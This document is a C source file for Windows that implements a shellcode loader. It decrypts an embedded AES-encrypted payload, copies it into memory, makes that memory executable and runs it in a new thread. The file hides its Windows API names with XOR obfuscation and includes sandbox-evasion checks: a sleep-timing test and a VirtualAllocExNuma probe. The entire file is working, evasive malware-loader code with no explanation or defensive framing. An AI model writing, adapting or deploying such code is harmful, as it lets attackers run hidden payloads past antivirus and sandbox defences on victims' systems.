#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <ctime>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

unsigned char payload[] = { 0x10, 0x73, 0xa6, 0x82, 0x7a, 0x8a, 0xe8, 0x23, 0x8f, 0x69, 0x7c, 0x2d, 0x36, 0xcf, 0x46, 0xa8, 0x71, 0xd7, 0xa2, 0x94, 0x4f, 0x03, 0x70, 0x86, 0x77, 0x04, 0x29, 0xd2, 0x27, 0xff, 0x9c, 0x1c, 0x2b, 0xfe, 0x6a, 0x35, 0xc4, 0x2d, 0x29, 0x72, 0xf2, 0xeb, 0xe9, 0x8c, 0x80, 0xcb, 0xcf, 0x6d, 0xd1, 0xfd, 0xc0, 0x6e, 0x44, 0xa0, 0xfd, 0xeb, 0xb7, 0xfe, 0x92, 0x87, 0x3c, 0x66, 0x79, 0x1b, 0x77, 0x6d, 0x14, 0x9e, 0x01, 0x8e, 0x8d, 0xa6, 0xcc, 0x0a, 0x2c, 0xb5, 0x6c, 0x85, 0xac, 0xac, 0xd7, 0xfc, 0x0b, 0xf8, 0xc2, 0x78, 0x5c, 0xe4, 0x30, 0x58, 0x2c, 0x1b, 0x52, 0x8c, 0x34, 0x8a, 0x8b, 0xf9, 0x0f, 0x08, 0xfc, 0x41, 0x92, 0x19, 0xfb, 0x2f, 0x00, 0xc6, 0x08, 0x8e, 0xd8, 0x20, 0x3a, 0xaa, 0xb8, 0xb0, 0x19, 0x92, 0x0d, 0x3f, 0x52, 0x62, 0xdd, 0xbb, 0xaf, 0x55, 0xe1, 0xe6, 0x7f, 0x66, 0x01, 0x5f, 0x71, 0x5c, 0x0d, 0x1d, 0x1d, 0xee, 0x73, 0x39, 0xbf, 0xa7, 0x91, 0x23, 0xa0, 0x16, 0xb9, 0xf6, 0x83, 0xa1, 0x4a, 0x4e, 0xee, 0x46, 0x42, 0xd2, 0x51, 0x60, 0xe4, 0x0b, 0x3d, 0x5a, 0xec, 0xe5, 0xa3, 0xdd, 0x36, 0x2b, 0x77, 0x5a, 0x28, 0x65, 0x9e, 0xcc, 0xbd, 0x7e, 0x36, 0x98, 0x0d, 0xb1, 0x68, 0xb0, 0x65, 0x24, 0xd2, 0xa8, 0x43, 0x86, 0xc3, 0x23, 0x7e, 0x85, 0xeb, 0xbe, 0xa9, 0x0f, 0x98, 0x5c, 0x0c, 0xf7, 0x89, 0x31, 0x3d, 0x4a, 0xc2, 0xa5, 0x12, 0x61, 0xa8, 0x8c, 0xb9, 0x14, 0xed, 0x23, 0x56, 0x8d, 0x39, 0x3f, 0x98, 0x46, 0x01, 0x35, 0x1a, 0x08, 0x87, 0x3a, 0xca, 0x87, 0x9b, 0x11, 0xc3, 0x5f, 0xb3, 0x4f, 0x3c, 0x3e, 0x42, 0xa9, 0x06, 0xa2, 0xde, 0x31, 0x84, 0xa5, 0xd7, 0x24, 0x33, 0x59, 0x4f, 0x1c, 0x97, 0x6d, 0x22, 0x8f, 0xb7, 0xf6, 0x29, 0x05, 0x4b, 0x5f, 0x93, 0xab, 0xf4, 0xda, 0xa3, 0xf0, 0x98, 0xfc, 0x52, 0x3f, 0x6a, 0xa8, 0xa1, 0x65, 0x67, 0xc3, 0x98, 0x19, 0x50, 0xff, 0x4f, 0xe0, 0xdb, 0x85, 0xb7, 0xd6, 0xaa, 0x4e, 0x68, 0x6e, 0x00, 0xfb, 0x2a, 0xab, 0x14, 0x1c, 0x67, 0xf3, 0xe7, 0xeb, 0x7f, 0xd1, 0x36, 0x9b, 0x2f, 0xab, 0x7e, 0x0f, 0xe4, 0xc5, 0xac, 0xa6, 0x80, 0xc9, 0xc8, 0x9a, 0x00, 0x43, 0x0a, 0x5a, 0x78, 0x13, 0xab, 0x38, 0x27, 0x81, 0x50, 0x2d, 0x39, 0xb3, 0x21, 0x38, 0x9f, 0xd2, 0x7a, 0x60, 0xab, 0x9b, 0x8c, 0xbe, 0xd8, 0xa6, 0x1d, 0xaa, 0xd1, 0x7e, 0x1f, 0x15, 0x81, 0x0d, 0x60, 0xc4, 0x0b, 0x13, 0xc6, 0x39, 0x32, 0x93, 0x88, 0xb5, 0xd0, 0xed, 0xbc, 0x24, 0xde, 0xbe, 0xa8, 0x5e, 0x55, 0x9e, 0x58, 0x68, 0xe6, 0x98, 0xdb, 0xe4, 0x0b, 0x16, 0xda, 0x3f, 0xb5, 0x1c, 0xde, 0xcd, 0x18, 0xd6, 0x0e, 0x03, 0x46, 0x30, 0x5c, 0xb5, 0x2e, 0x19, 0x28, 0x62, 0x15, 0x91, 0xbe, 0x23, 0x07, 0xcc, 0x75, 0x39, 0x07, 0x78, 0x8b, 0xc7, 0x26, 0xb4, 0x9f, 0x21, 0x03, 0x3c, 0x09, 0x4f, 0x9e, 0x25, 0xd9, 0xf9, 0x7e, 0x2d, 0xce, 0x28, 0xd5, 0x45, 0x68, 0xc0, 0x0f, 0x9b, 0xec, 0x44, 0x40, 0x6a, 0x53, 0xa9, 0x18, 0x92, 0x2b, 0xf5, 0xb8, 0x11, 0xcc, 0x73, 0x8c, 0xd0, 0xe3, 0x40, 0x37, 0xca, 0x31, 0x79, 0x37, 0x6e, 0xd7, 0xf1, 0x26, 0x21, 0x1c, 0x9b, 0x59, 0x0e, 0x64, 0xa3, 0x7e, 0x1a, 0x81, 0x5d, 0xb0, 0x1d, 0x4c, 0x58, 0x53, 0x95, 0x92, 0x08, 0xab, 0xa1, 0xc1, 0x91, 0x7f, 0x95, 0xab, 0xbc, 0x08, 0x65, 0x75, 0x10, 0xca, 0x32, 0xf9, 0x3e, 0x4e, 0x83, 0xa0, 0xe9, 0x23, 0x54, 0x62, 0xf6, 0x18, 0x02, 0x92, 0xe4, 0xfc, 0x96, 0x4e, 0x77, 0x44, 0xfa, 0xab, 0x3e, 0x73, 0x57, 0xaa, 0x1e, 0xc4, 0xf1, 0x2e, 0x1d, 0xf3, 0xf3, 0x37, 0xbd, 0x98, 0x39, 0x16, 0xa6, 0x88, 0x73, 0x7a, 0x93, 0xcd, 0x33, 0x5e, 0xc5, 0x96, 0x3f, 0xd3, 0x5d, 0x0b, 0xf9, 0xa0, 0x63, 0x41, 0xfe, 0xe4, 0x97, 0xd0, 0xc6, 0x08, 0x86, 0x29, 0x5a, 0xbe, 0x22, 0x86, 0x8e, 0xb5, 0x9d, 0xbe, 0xea, 0xbf, 0xc3, 0x12, 0x59, 0x43, 0x4d, 0xce, 0xd9, 0xf3, 0xf7, 0x81, 0x9a, 0x29, 0xad, 0x33, 0xc8, 0xc1, 0x3a, 0x37, 0x69, 0x5f, 0x83, 0x7f, 0x75, 0xce, 0x23, 0x7b, 0x68, 0x2f, 0x63, 0xff, 0x94, 0xa3, 0x98, 0xed, 0x1a, 0xd1, 0xd4, 0x33, 0xfa, 0x21, 0xc1, 0x00, 0x70, 0xdb, 0x42, 0xd9, 0xe4, 0xc5, 0x03, 0x75, 0x3a, 0x77, 0x22, 0x7c, 0x06, 0x7e, 0xdc, 0x3d, 0x25, 0x75, 0x65, 0xe9, 0x77, 0x6b, 0x41, 0x7e, 0x12, 0x5d, 0xa5, 0x40, 0xc1, 0xbd, 0xa0, 0xfc, 0x15, 0x9a, 0xc7 };
char key[] = "GetNewVersionNumber";

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    for (size_t i = 0, j = 0; i < data_len; i++, j++) {
        if (j == key_len) j = 0;
        data[i] ^= key[j];
    }
}


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        return 0;
}

LPVOID (WINAPI * pAlloc) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD flProtect);
BOOL (WINAPI * pProtect) (LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, DWORD lpflOldProtect);
void (WINAPI * pmvMe) (void *Destination, const void *Source, size_t Length);
HANDLE (WINAPI * pthreadA)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD (WINAPI * pwFSO)(HANDLE hHandle, DWORD dwMilliseconds);
LPVOID (WINAPI * exNuma) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect, DWORD nnDPreferred);

void evade(){

	time_t startTime, newTime;
	time(&startTime);
	Sleep(2000);
	time(&newTime);
	double elapsed = difftime(newTime, startTime);
	if (elapsed < 1.5){
		exit(0);
	}

	char pNuma[] = {0x11,0x0c,0x06,0x3a,0x10,0x16,0x3a,0x24,0x1e,0x1f,0x06,0x0c,0x2b,0x36,0x3b,0x18,0x0f,0x04};
	XOR((char *) pNuma, sizeof(pNuma), key, strlen(key));

	exNuma = GetProcAddress(GetModuleHandle("kernel32.dll"), pNuma);

	LPVOID memcheck = exNuma(GetCurrentProcess(), 0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);

	if (memcheck == NULL){
		exit(0);
	}
}

int main(void) {

	evade();

	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	unsigned int lengthyBoi = sizeof(payload);

	
	
	char AESkey[] = { 0x2a, 0xdb, 0x65, 0xc1, 0xad, 0x5e, 0xa0, 0xed, 0x53, 0x8a, 0x15, 0x63, 0x47, 0x8b, 0x82, 0x22 };

	char unAlloc[] = {0x11,0x0c,0x06,0x3a,0x10,0x16,0x3a,0x24,0x1e,0x1f,0x06,0x0c};
	XOR((char *) unAlloc, sizeof(unAlloc), key, strlen(key));

	char sProtect[] = {0x11,0x0c,0x06,0x3a,0x10,0x16,0x3a,0x35,0x00,0x1c,0x1d,0x0a,0x0d,0x3a};
	XOR((char *) sProtect, sizeof(sProtect), key, strlen(key));

	char mvMe[] = {0x15,0x11,0x18,0x03,0x0a,0x01,0x33,0x28,0x17,0x1e,0x06,0x1d,0x17};
	XOR((char *) mvMe, sizeof(mvMe), key, strlen(key));

	char threadA[] = {0x04,0x17,0x11,0x2f,0x11,0x12,0x02,0x0d,0x00,0x16,0x08,0x0b};
	XOR((char *) threadA, sizeof(threadA), key, strlen(key));

	char wFSO[] = {0x10,0x04,0x1d,0x3a,0x23,0x18,0x24,0x36,0x1b,0x1d,0x0e,0x03,0x0b,0x01,0x17,0x07,0x07,0x06,0x06};
	XOR((char *) wFSO, sizeof(wFSO), key, strlen(key));	

	pAlloc= GetProcAddress(GetModuleHandle("kernel32.dll"), unAlloc);

	pProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), sProtect);

	pmvMe = GetProcAddress(GetModuleHandle("ntdll.dll"), mvMe);

	pthreadA = GetProcAddress(GetModuleHandle("kernel32.dll"), threadA);

	pwFSO = GetProcAddress(GetModuleHandle("kernel32.dll"), wFSO);

	exec_mem = pAlloc(0, lengthyBoi, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	AESDecrypt((char *) payload, lengthyBoi, AESkey, sizeof(AESkey));

	pmvMe(exec_mem, payload, lengthyBoi);

	rv = pProtect(exec_mem, lengthyBoi, PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0){
		th = pthreadA(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		pwFSO(th, -1);
	}

	return 0;
}
